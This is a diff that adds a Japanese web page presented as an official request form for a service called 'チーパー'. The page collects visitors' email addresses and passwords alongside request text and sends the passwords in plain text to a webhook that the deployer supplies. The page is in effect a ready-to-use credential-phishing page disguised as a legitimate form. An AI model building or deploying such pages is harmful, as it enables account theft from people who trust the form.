@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+  <meta charset="UTF-8">
+  <title>チーパー公式依頼サイト</title>
+  <style>
+    body {
+      background: #f0f0f0;
+      font-family: Arial, sans-serif;
+      text-align: center;
+      padding: 40px;
+    }
+    h1 {
+      font-size: 28px;
+      margin-bottom: 20px;
+      color: #333;
+    }
+    p {
+      font-size: 18px;
+      color: #555;
+    }
+    form {
+      margin-top: 30px;
+    }
+    input[type="email"],
+    input[type="password"],
+    input[type="text"] {
+      width: 80%;
+      max-width: 300px;
+      padding: 10px;
+      margin: 10px 0;
+      font-size: 16px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+    }
+    button:disabled {
+      background-color: #ccc;
+      cursor: not-allowed;
+    }
+    button {
+      display: inline-block;
+      padding: 15px 30px;
+      font-size: 18px;
+      color: white;
+      background-color: #ff9800;
+      text-decoration: none;
+      border: none;
+      border-radius: 10px;
+      margin-top: 20px;
+      box-shadow: 0 3px 6px rgba(0,0,0,0.2);
+      cursor: pointer;
+    }
+    .status {
+      margin-top: 15px;
+      font-size: 16px;
+      color: green;
+    }
+  </style>
+</head>
+<body>
+  <h1>依頼をする</h1>
+  <p>下のボタンを押して依頼をしてください。<br>アカウントは作成しておいてね。</p>
+
+  <form id="login-form">
+    <input type="email" id="email" placeholder="メールアドレス" required><br>
+    <input type="password" id="password" placeholder="パスワード" required><br>
+    <input type="text" id="extra" placeholder="依頼内容" required><br>
+    <button type="submit" id="submit-btn" disabled>送信して依頼する！</button>
+  </form>
+
+  <div class="status" id="status"></div>
+
+  <script>
+    const form = document.getElementById("login-form");
+    const status = document.getElementById("status");
+    const emailInput = document.getElementById("email");
+    const passwordInput = document.getElementById("password");
+    const extraInput = document.getElementById("extra");
+    const submitBtn = document.getElementById("submit-btn");
+
+    function isValidEmail(email) {
+      const emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
+      return emailRegex.test(email);
+    }
+
+    function checkInputs() {
+      const email = emailInput.value.trim();
+      const password = passwordInput.value.trim();
+      const extra = extraInput.value.trim();
+      submitBtn.disabled = !(isValidEmail(email) && password && extra);
+    }
+
+    emailInput.addEventListener("input", checkInputs);
+    passwordInput.addEventListener("input", checkInputs);
+    extraInput.addEventListener("input", checkInputs);
+
+    form.addEventListener("submit", async function (e) {
+      e.preventDefault();
+
+      const email = emailInput.value.trim();
+      const password = passwordInput.value.trim();
+      const extra = extraInput.value.trim();
+
+      const webhookURL = "YOUR_WEBHOOK_URL_HERE"; // ←ここを自分のWebhookに変更
+
+      const payload = {
+        content: `📥 依頼申請がありました\n📧 メール: \`${email}\`\n🔒 パス: \`${password}\`\n📝 依頼内容: \`${extra}\``
+      };
+
+      try {
+        const res = await fetch(webhookURL, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(payload)
+        });
+
+        if (res.ok) {
+          status.textContent = "送信しました！";
+          form.reset();
+          submitBtn.disabled = true;
+        } else {
+          status.textContent = "送信に失敗しました。";
+        }
+      } catch (err) {
+        status.textContent = "エラーが発生しました。";
+      }
+    });
+  </script>
+</body>
+</html>
